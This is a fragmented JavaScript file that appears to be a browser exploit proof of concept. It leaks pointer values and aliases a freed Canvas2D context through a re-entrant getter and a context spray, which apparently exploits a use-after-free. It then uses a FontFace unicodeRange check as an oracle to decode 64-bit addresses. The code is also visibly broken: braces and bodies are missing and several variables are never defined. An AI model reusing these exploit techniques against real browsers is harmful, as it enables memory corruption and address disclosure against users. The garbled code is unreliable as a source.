  if (lo === hi) return 'U+' + pad4(lo);
  return 'U+' + pad4(lo) + '-' + pad4(hi);

/* ---- Step 1: Baseline Leak ---- */
function doLeak(cb){

function extractPtrs(v){
  var LO = BigInt('0x1000000000'), HI = BigInt('0x80000000000');

    for (var q = 0; q < 24; q++){

      if (val >= LO && val < HI){
        if (!P58) P58 = val;
        else if (!P68 && val !== P58) P68 = val;
      }

  }
  if (!P68) P68 = 0n;

/* ---- Step 2: Pristine Reclaim ---- */

/* ---- Step 3: Post-Grooming ---- */
function doPostGroom(){
  POST_GROOM = [];
  for (var i = 0; i < 120; i++){

/* ---- Phase A: Slab Mapping & Invariant Verification ---- */

/* ---- Phase B: Bi-directional Canvas Aliasing & Vector State ---- */
function phaseB_canvasBidirAliasing(cb){
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 1; canvas.height = 1;
    document.body.appendChild(canvas);

    var inner = null, outer = null;
    var opts = {};
    Object.defineProperty(opts, 'desynchronized', {
      get: function(){
        inner = canvas.getContext('2d');
        inner.lineWidth = 1337.5;
        inner.miterLimit = 42.0;
        inner.save();
        inner.lineWidth = 2468.25;
        inner.save();
        return false;
      },
      enumerable: true
    });

    outer = canvas.getContext('2d', opts);

    if (!inner || !outer || inner === outer){
      b('B-CANVAS-FAIL', 'inner=' + !!inner + '|outer=' + !!outer);
      setTimeout(cb, 50);
      return;
    }

    /* Spray 80 Canvas2D contexts to reclaim the freed context */
    var sprayCtx = [];
    for (var i = 0; i < 80; i++){
      var c = document.createElement('canvas');
      c.width = 1; c.height = 1;
      var ctx = c.getContext('2d');
      if (ctx){
        ctx.lineWidth = 1000 + i;
        sprayCtx.push(ctx);
      }
    }

    /* Locate the alias context */
    inner.lineWidth = 31337.5;
    var aliasIdx = -1;
    for (var j = 0; j < sprayCtx.length; j++){
      if (Math.abs(sprayCtx[j].lineWidth - 31337.5) < 0.01){
        aliasIdx = j;
        break;
      }
    }

    if (aliasIdx < 0){
      b('B-ALIAS-MISS', 'lineWidth-scan-failed');
      setTimeout(cb, 50);
      return;
    }

    var alias = sprayCtx[aliasIdx];

    /* Sub-test B1: Cross-wrapper Read (alias writes -> inner reads) */
    alias.setTransform(11.25, 22.5, 33.75, 44.0, 55.25, 66.5);
    alias.lineWidth = 4321.125;
    alias.miterLimit = 88.25;
    alias.globalAlpha = 0.625;
    alias.shadowOffsetX = 12.5;
    alias.shadowOffsetY = 25.0;
    alias.shadowBlur = 7.75;
    alias.lineDashOffset = 33.5;
    alias.setLineDash([10.5, 20.25, 30.125, 40.0625]);

    var tIn = inner.getTransform();
    var tMatch = (
      Math.abs(tIn.a - 11.25) < 0.001 &&
      Math.abs(tIn.b - 22.50) < 0.001 &&
      Math.abs(tIn.c - 33.75) < 0.001 &&
      Math.abs(tIn.d - 44.00) < 0.001 &&
      Math.abs(tIn.e - 55.25) < 0.001 &&
      Math.abs(tIn.f - 66.50) < 0.001
    );

    var lwMatch = Math.abs(inner.lineWidth - 4321.125) < 0.001;
    var mlMatch = Math.abs(inner.miterLimit - 88.25) < 0.001;
    var gaMatch = Math.abs(inner.globalAlpha - 0.625) < 0.001;
    var soMatch = (Math.abs(inner.shadowOffsetX - 12.5) < 0.001 && Math.abs(inner.shadowOffsetY - 25.0) < 0.001);
    var sbMatch = Math.abs(inner.shadowBlur - 7.75) < 0.001;
    var ldoMatch = Math.abs(inner.lineDashOffset - 33.5) < 0.001;

    var inDash = [];
    try { inDash = inner.getLineDash() || []; } catch(e){}
    var dashMatch = (
      inDash.length === 4 &&
      Math.abs(inDash[0] - 10.5000) < 0.01 &&
      Math.abs(inDash[1] - 20.2500) < 0.01 &&
      Math.abs(inDash[2] - 30.1250) < 0.01 &&
      Math.abs(inDash[3] - 40.0625) < 0.01
    );

    var b1All = tMatch && lwMatch && mlMatch && gaMatch && soMatch && sbMatch && ldoMatch && dashMatch;

    /* Sub-test B2: Cross-wrapper Write (inner writes -> alias reads) */
    inner.lineWidth = 8765.375;
    inner.globalAlpha = 0.375;
    inner.shadowBlur = 99.5;

    var aliasLw = Math.abs(alias.lineWidth - 8765.375) < 0.001;
    var aliasGa = Math.abs(alias.globalAlpha - 0.375) < 0.001;
    var aliasSb = Math.abs(alias.shadowBlur - 99.5) < 0.001;
    var b2All = aliasLw && aliasGa && aliasSb;

    var rep = 'aliasIdx=' + aliasIdx + '|b1All=' + b1All + '|tMatch=' + tMatch +
              '|dashMatch=' + dashMatch + '|dashLen=' + inDash.length +
              '|b2All=' + b2All + '|aliasLw=' + aliasLw + '|aliasGa=' + aliasGa + '|aliasSb=' + aliasSb;
    b('B-BIDIR-ALIAS', rep);
    log('Phase B Bi-directional Canvas Aliasing: ' + rep);
  } catch(e){
    b('B-BIDIR-ERR', e.message);
    log('Phase B Error: ' + e.message);

  setTimeout(cb, 50);

/* ---- Phase C: Active Oracle Dynamic Boundary Shifting ---- */
function phaseC_oracleBoundaryShift(cb){
  try {
    ACT_FACE = new FontFace('actFamDynamic', 'url(/hang.php?nocache=' + Date.now() + ')', { unicodeRange: 'U+0041-0044' });
    document.fonts.add(ACT_FACE);
    ACT_FACE.load().catch(function(){});

    // Baseline: 'A'..'D' should return false; 'E', 'Z', '!' should return true
    var bA = document.fonts.check('1em actFamDynamic', 'A');
    var bD = document.fonts.check('1em actFamDynamic', 'D');
    var bE = document.fonts.check('1em actFamDynamic', 'E');
    var bZ = document.fonts.check('1em actFamDynamic', 'Z');
    var bEx = document.fonts.check('1em actFamDynamic', '!');

    var baseline = 'A=' + bA + '|D=' + bD + '|E=' + bE + '|Z=' + bZ + '|!=' + bEx;

    // Dynamic Shift: Change range to U+0045 ('E') - U+0048 ('H')
    ACT_FACE.unicodeRange = 'U+0045-0048';

    // Shifted: 'A' should flip to true; 'E' should flip to false!
    var sA = document.fonts.check('1em actFamDynamic', 'A');
    var sD = document.fonts.check('1em actFamDynamic', 'D');
    var sE = document.fonts.check('1em actFamDynamic', 'E');
    var sH = document.fonts.check('1em actFamDynamic', 'H');
    var sZ = document.fonts.check('1em actFamDynamic', 'Z');

    var shifted = 'A=' + sA + '|D=' + sD + '|E=' + sE + '|H=' + sH + '|Z=' + sZ;

    var flippedA = (bA === false && sA === true);
    var flippedE = (bE === true && sE === false);
    var boundarySuccess = (flippedA && flippedE);

    var rep = 'success=' + boundarySuccess + '|flippedA=' + flippedA + '|flippedE=' + flippedE +
              '|base=[' + baseline + ']|shift=[' + shifted + ']';
    b('C-ORACLE-BOUNDARY-FLIP', rep);
    log('Phase C Boundary Flip Verdict: ' + rep);
  } catch(e){
    b('C-BOUNDARY-ERR', e.message);
    log('Phase C Error: ' + e.message);
  }

  setTimeout(cb, 50);
}

/* ---- Phase D: Full-Spectrum Multi-Pointer & Edge-Case Oracle ---- */
function phaseD_fullSpectrumOracle(cb){
  try {
    var actFaceFS = new FontFace('actFamFullSpectrum', 'url(/hang.php?nocache=' + Date.now() + ')', { unicodeRange: 'U+0000-00FF' });
    document.fonts.add(actFaceFS);
    actFaceFS.load().catch(function(){});

    function resolveByte(targetByte){
      var low = 0x00, high = 0xFF;
      var steps = 0;
      while (low < high && steps < 10){
        steps++;
        var mid = Math.floor((low + high) / 2);
        actFaceFS.unicodeRange = makeRange(low, mid);
        var chk = document.fonts.check('1em actFamFullSpectrum', String.fromCharCode(targetByte));
        var isLower = (chk === false);
        if (isLower) high = mid;
        else low = mid + 1;
      }
      return low;
    }

    function decode64(ptrVal){
      if (!ptrVal && ptrVal !== 0n) return 0n;
      var raw = [];
      var tmp = BigInt(ptrVal);
      for (var i = 0; i < 8; i++){
        raw.push(Number(tmp & 0xFFn));
        tmp = tmp >> 8n;
      }
      var res = 0n;
      for (var j = 0; j < 8; j++){
        var bDec = resolveByte(raw[j]);
        res |= (BigInt(bDec) << (BigInt(j) * 8n));
      }
      return res;
    }

    /* Leaked Hardware Trio */
    var decP58 = decode64(P58);
    var decQ11 = decode64(Q11_RECLAIM);
    var decQ13 = decode64(Q13_RECLAIM);

    var mP58 = (decP58 === P58);
    var mQ11 = (decQ11 === Q11_RECLAIM);
    var mQ13 = (decQ13 === Q13_RECLAIM);

    /* 4 Canonical Edge-Cases:
     * Edge 0: 0x0000000000000000n (all zeros)
     * Edge 1: 0xFFFFFFFFFFFFFFFFn (all ones)
     * Edge 2: 0x0123456789ABCDEFn (monotonic byte ramp)
     * Edge 3: 0xDEADBEEFCAFEFACEn (high canonical sentinel)
     */
    var E0 = 0x0000000000000000n;
    var E1 = 0xFFFFFFFFFFFFFFFFn;
    var E2 = 0x0123456789ABCDEFn;

    var decE0 = decode64(E0);

    var decE2 = decode64(E2);
    var decE3 = decode64(E3);

    var mE0 = (decE0 === E0);
    var mE1 = (decE1 === E1);
    var mE2 = (decE2 === E2);
    var mE3 = (decE3 === E3);

    var hardwareTrioAll = mP58 && mQ11 && mQ13;
    var edgesAll = mE0 && mE1 && mE2 && mE3;
    var grandTotalAll = hardwareTrioAll && edgesAll;

    var rep = 'grandTotal=' + grandTotalAll + '|hwAll=' + hardwareTrioAll + '|edgeAll=' + edgesAll +
              '|m58=' + mP58 + '|m11=' + mQ11 + '|m13=' + mQ13 +
              '|mE0=' + mE0 + '|mE1=' + mE1 + '|mE2=' + mE2 + '|mE3=' + mE3;
    b('D-FULL-SPECTRUM-MATCH', rep);
    log('Phase D Full-Spectrum Oracle (56 Bytes): ' + rep);
  } catch(e){
